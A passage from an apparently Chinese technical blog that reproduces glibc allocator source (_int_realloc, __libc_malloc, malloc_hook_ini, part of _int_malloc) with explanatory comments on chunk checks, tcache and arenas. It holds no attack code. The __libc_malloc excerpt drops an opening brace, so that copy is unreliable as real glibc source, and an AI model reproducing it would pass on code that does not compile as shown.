class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span>* _int_realloc(mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize,<br>     INTERNAL_SIZE_T nb)<br>&#123;<br>  mchunkptr        newp;<br>  INTERNAL_SIZE_T  newsize;<br>  <span class="hljs-type">void</span>*          newmem;<br>  mchunkptr        next;<br>  mchunkptr        remainder;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>    remainder_size;<br>  <span class="hljs-keyword">if</span> (__builtin_expect (chunksize_nomask (oldp) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>      || __builtin_expect (oldsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>    malloc_printerr (<span class="hljs-string">&quot;realloc(): invalid old size&quot;</span>);<br>    <span class="hljs-comment">// 对原chunk的size进行安全检测</span><br><br>  check_inuse_chunk (av, oldp);<br>    <span class="hljs-comment">// 对原chunk进行检测</span><br>  assert (!chunk_is_mmapped (oldp));<br>    <span class="hljs-comment">// 进入int_realloc函数的chunk肯定不由mmap创建的</span><br>  next = chunk_at_offset (oldp, oldsize);<br>  INTERNAL_SIZE_T nextsize = chunksize (next);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (chunksize_nomask (next) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>      || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>    malloc_printerr (<span class="hljs-string">&quot;realloc(): invalid next size&quot;</span>);<br>    <span class="hljs-comment">// 检测下一个chunk的size是否合法</span><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (oldsize) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>    &#123;<br>      newp = oldp;<br>      newsize = oldsize;<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> (next == av-&gt;top &amp;&amp;<br>          (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (newsize = oldsize + nextsize) &gt;=<br>          (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>        &#123; <span class="hljs-comment">// 如果当前chunk的下一个chunk为top chunk</span><br>          <span class="hljs-comment">// 则直接分裂top chunk，来扩建当前chunk</span><br>          set_head_size (oldp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>          av-&gt;top = chunk_at_offset (oldp, nb);<br>          set_head (av-&gt;top, (newsize - nb) | PREV_INUSE);<br>          check_inuse_chunk (av, oldp);<br>          <span class="hljs-keyword">return</span> chunk2mem (oldp);<br>        &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (next != av-&gt;top &amp;&amp;<br>               !inuse (next) &amp;&amp;<br>               (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (newsize = oldsize + nextsize) &gt;=<br>               (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>        &#123;<br>          <span class="hljs-comment">// 如果下一个chunk不是top chunk，但下一个chunk为空闲chunk</span><br>          <span class="hljs-comment">// 且当前chunk的大小加上下一个chunk的大小比用户需要的大</span><br>          <span class="hljs-comment">// 则合并两个chunk，并将后一个chunk从原先的链表中分离出来</span><br>          newp = oldp;<br>          unlink_chunk (av, next);<br>        &#125;<br>      <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-comment">// 如果当前chunk无法与下一个chunk合并</span><br>          <span class="hljs-comment">// 且下一个chunk不是top chunk</span><br><br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             使用malloc获取chunk</span><br><span class="hljs-comment">             如果获取到的chunk的地址为下一个chunk地址</span><br><span class="hljs-comment">                (下一个chunk可能在fast bin与tcache bin中)</span><br><span class="hljs-comment">             则先合并当前chunk与下一个chunk</span><br><span class="hljs-comment">             如果与当前chunk不相邻，则释放当前chunk</span><br><span class="hljs-comment">              将新获取的chunk返回给用户 </span><br><span class="hljs-comment">          */</span><br>          newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK);<br>          <span class="hljs-keyword">if</span> (newmem == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>          newp = mem2chunk (newmem);<br>          newsize = chunksize (newp);<br>          <span class="hljs-keyword">if</span> (newp == next)<br>            &#123;<br>              newsize += oldsize;<br>              newp = oldp;<br>            &#125;<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>      <span class="hljs-built_in">memcpy</span> (newmem, chunk2mem (oldp), oldsize - SIZE_SZ);<br>              _int_free (av, oldp, <span class="hljs-number">1</span>);<br>              check_inuse_chunk (av, newp);<br>              <span class="hljs-keyword">return</span> chunk2mem (newp);<br>            &#125;<br>        &#125;<br>    &#125;<br>  assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (newsize) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb));<br>    <span class="hljs-comment">// 程序执行到这里，新chunk的大小必定大于原chunk</span><br><br>  <span class="hljs-comment">/* 尝试分裂当前chunk，尝试将多余的空间组成一个新的chunk，并释放 */</span><br>  remainder_size = newsize - nb;<br>  <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>    &#123;<br>      set_head_size (newp, newsize | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>      set_inuse_bit_at_offset (newp, newsize);<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      remainder = chunk_at_offset (newp, nb);<br>      set_head_size (newp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>      set_head (remainder, remainder_size | PREV_INUSE |<br>                (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>      set_inuse_bit_at_offset (remainder, remainder_size);<br>      _int_free (av, remainder, <span class="hljs-number">1</span>);<br>    &#125;<br>  check_inuse_chunk (av, newp);<br>  <span class="hljs-keyword">return</span> chunk2mem (newp);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="malloc">malloc</h3><h4 id="libc-malloc">__libc_malloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim;<br><br>  <span class="hljs-keyword">_Static_assert</span> (PTRDIFF_MAX &lt;= SIZE_MAX / <span class="hljs-number">2</span>,<br>                  <span class="hljs-string">&quot;PTRDIFF_MAX is not more than half of SIZE_MAX&quot;</span>);<br>   <span class="hljs-comment">/* 当地址之间的差距不大于 size_t类型的数据所储存的最大数/2</span><br><span class="hljs-comment">    则报错 */</span><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>  <span class="hljs-comment">/* 检测 malloc_hook 中是否存有函数地址，</span><br><span class="hljs-comment">      如果有则调用指向的函数 </span><br><span class="hljs-comment">     在第一次调用 __libc_malloc 时,</span><br><span class="hljs-comment">      __malloc_hook中储存了malloc_hook_ini函数地址</span><br><span class="hljs-comment">      用于分配区初始化</span><br><span class="hljs-comment">      */</span><br>    <br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* tcache从glibc2.26开始被使用 */</span><br><br>  <span class="hljs-type">size_t</span> tbytes;<br>  <span class="hljs-keyword">if</span> (!checked_request2size (bytes, &amp;tbytes))<br>    &#123; <br>      __set_errno (ENOMEM);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>      <span class="hljs-comment">/* 如果用户申请的chunk超过了可索引的地址范围</span><br><span class="hljs-comment">          就返回NULL 表示分配失败 */</span><br>    &#125;<br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (tbytes);<br>   <span class="hljs-comment">/* 获取chunk的size对应的tcache bin的编号 */</span><br>  MAYBE_INIT_TCACHE ();<br>   <span class="hljs-comment">/* 检测tcache bins是否被初始化过，</span><br><span class="hljs-comment">        如果还未初始化tcache bins,</span><br><span class="hljs-comment">        则调用tcache_init函数对tcache bins进行初始化操作*/</span><br>  DIAG_PUSH_NEEDS_COMMENT;<br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins<br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="hljs-number">0</span>)<br>    &#123; <span class="hljs-comment">/* 当存在对应的tcache bin，且tcache bin中存在chunk</span><br><span class="hljs-comment">         则直接将tcache bin中的chunk返回给用户 */</span><br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br>  <span class="hljs-comment">/* 当使用了tcache bin时，先从tcache bin中获取chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>    &#123;  <span class="hljs-comment">/* 当程序仅有一个线程时，使用_int_malloc申请chunk</span><br><span class="hljs-comment">          并对返回的chunk地址进行验证(创建失败 或 由mmap分配 或 由主分配区分配) */</span><br>      victim = _int_malloc (&amp;main_arena, bytes);<br>      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));<br>      <span class="hljs-keyword">return</span> victim;<br>    &#125;<br><br>  arena_get (ar_ptr, bytes);<br>  <span class="hljs-comment">/* 获取当前线程分配区，当当前分配区为空时，尝试使用其他分配区 */</span><br>  victim = _int_malloc (ar_ptr, bytes);<br>  <br>  <span class="hljs-comment">/* 利用_int_malloc申请chunk */</span><br><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>      <span class="hljs-comment">/* 当无法使用当前线程分配区申请chunk时，使用其他的分配区申请chunk */</span><br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br>  <br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<br>  <span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="malloc-hook-ini">malloc_hook_ini</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">malloc_hook_ini</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> sz, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *caller)</span><br>&#123;<br>  __malloc_hook = <span class="hljs-literal">NULL</span>;<br>  ptmalloc_init (); <span class="hljs-comment">/* 初始化主分配区,初始化分配区中的bin*/</span><br>  <span class="hljs-keyword">return</span> __libc_malloc (sz);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="int-malloc">_int_malloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br>_int_malloc (mstate av, <span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  INTERNAL_SIZE_T nb;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx;<br>  mbinptr bin;<br>  mchunkptr victim;<br>  INTERNAL_SIZE_T size;<br>  <span class="hljs-type">int</span> victim_index;<br>  mchunkptr remainder;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bit;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">map</span>;<br>  mchunkptr fwd;<br>  mchunkptr bck;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-type">size_t</span> tcache_unsorted_count;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>   <span class="hljs-comment">/* 检测申请的chunk，因为申请chunk不只有malloc，还有calloc,realloc，</span><br><span class="hljs-comment">      所以在_int_malloc中再检测一次请求的大小是否合法 */</span><br><br>  <span class="hljs-keyword">if</span> (!checked_request2size (bytes, &amp;nb))<br>    &#123;<br>      __set_errno (ENOMEM);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (av == <span class="hljs-literal">NULL</span>))<br>    &#123;<br>      <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>      <span class="hljs-comment">/* 当av==NULL时，表示没有分配区可以分配chunk了，所以需要调用sysmalloc从系统分配空间 */</span><br><br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>alloc_perturb (p, bytes); <span class="hljs-comment">/* 初始化chunk data */</span><br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REMOVE_FB(fb, victim, pp)\</span><br><span class="hljs-meta">  do\</span><br><span class="hljs-meta">    &#123;\</span><br><span class="hljs-meta">      victim = pp;\</span><br><span class="hljs-meta">      <span class="hljs-keyword">if</span> (victim == NULL)\</span><br><span class="hljs-meta">break;\</span><br><span class="hljs-meta">    &#125;\</span><br><span class="hljs-meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="hljs-meta"> != victim);<span class="hljs-comment">/* 在存在多个线程的情况下，用于取出当前bin中第一个chunk */</span></span><br><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span 